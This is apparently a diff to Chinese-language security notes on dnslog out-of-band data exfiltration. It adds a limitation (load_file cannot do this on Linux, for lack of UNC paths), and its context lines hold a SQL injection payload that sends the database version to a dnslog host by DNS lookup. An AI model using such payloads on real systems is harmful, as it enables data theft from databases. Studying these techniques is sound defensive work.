@@ -96,6 +96,8 @@ dnslog
 	+ RFI（Remote File Inclusion）
 - 原理
 	将dnslog平台中的特有字段payload带入目标发起dns请求，通过dns解析将请求后的关键信息组合成新的三级域名带出，在ns服务器的dns日志中显示出来。
+- 限制
+	load_file函数在Linux下是无法用来做dnslog攻击的，因为Linux没有UNC路径(UNC路径就是类似\\softer这样的形式的网络路径)。
 - 示例
 	+ ``select load_file('\\\\',version(),'.dnslog地址')``
 
